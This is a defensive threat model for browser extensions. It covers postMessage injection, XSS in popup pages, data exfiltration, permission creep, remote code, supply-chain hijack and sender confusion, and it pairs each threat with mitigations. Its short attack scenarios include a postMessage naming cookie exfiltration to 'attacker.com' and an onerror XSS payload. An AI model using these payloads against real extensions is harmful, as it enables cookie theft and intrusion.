# Extension Security — Threat Model

## Threat Surface

Browser extensions run with elevated privileges inside the browser — they can access tabs, history, cookies, and network traffic for declared origins. This makes them high-value targets.

1. **Malicious postMessage injection** — untrusted page injects commands via postMessage to content script
2. **XSS in extension pages** — popup or options page renders unsanitized HTML
3. **Content script data exfiltration** — content script reads DOM data and leaks it externally
4. **Permission creep** — extension requests more permissions than needed, expanding attack surface
5. **Remote code execution via remote scripts** — extension loads external JS (blocked by MV3 CSP, but check)
6. **Supply chain / update hijack** — attacker compromises extension or its dependencies and pushes malicious update
7. **Cross-origin message confusion** — background script processes messages from unvalidated senders

---

## Threat 1: Malicious postMessage Injection

**Description:** A page's JavaScript sends a postMessage that the content script processes as if it were a legitimate command, causing unintended actions (data reads, DOM mutations, message forwarding).

**Attack scenario:**
```javascript
// Attacker on page injects:
window.postMessage({ type: 'EXFILTRATE_COOKIES', target: 'attacker.com' }, '*')
// Content script listens to window messages without origin validation → executes
```

**Mitigations:**
- Validate `event.source === window` for same-frame messages
- Validate `event.origin` for cross-frame messages
- Use a typed message schema and reject unknown `type` values
- Never trust the `type` field alone — validate full message structure

---

## Threat 2: XSS in Extension Pages

**Description:** Extension popup or options page renders user-supplied or externally-fetched HTML/text via `innerHTML`, `document.write()`, or similar, enabling script injection.

**Attack scenario:**
```javascript
// Popup renders a page title fetched from storage:
document.getElementById('title').innerHTML = chrome.storage.local.get('pageTitle')
// Attacker has injected: pageTitle = '<img src=x onerror=stealCookies()>'
```

**Mitigations:**
- Never use `innerHTML`, `outerHTML`, `insertAdjacentHTML` with external data
- Use `textContent` for text, `createElement` + `appendChild` for structured content
- Use a template library with auto-escaping (e.g., lit-html) if templates are needed
- `content_security_policy` in manifest blocks inline scripts as a defense-in-depth layer

---

## Threat 3: Content Script Data Exfiltration

**Description:** Compromised or buggy content script reads sensitive DOM data (form inputs, page text, credentials) and sends it to an external server.

**Mitigations:**
- Content scripts should read only the specific DOM data they need for their declared function
- All network calls from extension must go to declared `host_permissions` origins only
- Content scripts should send data to background (via `chrome.runtime.sendMessage`) not directly to external servers
- Background validates all outbound destinations against declared allowlist

---

## Threat 4: Permission Creep

**Description:** Extension requests broad permissions (`<all_urls>`, `tabs`, `webNavigation`) it doesn't need, expanding the blast radius of any compromise.

**Mitigations:**
- Use `activeTab` instead of `<all_urls>` when possible
- Use specific host patterns instead of `<all_urls>`
- Request `optional_permissions` at runtime (user grants on demand) instead of at install
- Remove permissions at major version if no longer used
- Verify each permission against design-document.md permission table before release

---

## Threat 5: Remote Code Execution

**Description:** Extension loads external JavaScript (from CDN, remote server, or injected by page) and executes it in the extension context.

**MV3 protection:** `manifest_version: 3` prohibits `eval()` and remote script sources by default via strict CSP. This threat is largely mitigated by MV3 adoption.

**Residual mitigations:**
- CSP must be: `script-src 'self'; object-src 'none';` — no external script sources, no `unsafe-eval`
- Never use `eval()`, `new Function()`, or `setTimeout(string)` in extension code
- Never inject `<script src="https://...">` into the page from content scripts

---

## Threat 6: Supply Chain / Update Hijack

**Description:** Attacker compromises the extension's store account, CI pipeline, or a critical dependency to push a malicious update to all users.

**Mitigations:**
- Enable 2FA on store developer account
- Publish from CI only (no developer machine publish)
- Lock dependency versions in lockfile
- Audit dependencies: `npm audit` in CI with zero critical/high gate
- Review changelog of dependencies before updating
- For sensitive extensions: sign release artifacts separately and document verification process

---

## Threat 7: Cross-Origin Message Confusion

**Description:** Background service worker receives messages from content scripts on attacker-controlled pages and processes them without verifying the sender's tab/origin.

**Attack scenario:**
```javascript
// Attacker page's content script sends:
chrome.runtime.sendMessage({ type: 'ADMIN_ACTION', data: {...} })
// Background processes ADMIN_ACTION without checking tab origin
```

**Mitigations:**
- Background checks `sender.tab.url` or `sender.origin` for sensitive operations
- Classify messages by trust level: popup messages (trusted) vs content script messages (untrusted)
- Untrusted messages (from content scripts) must not trigger privileged operations without user confirmation
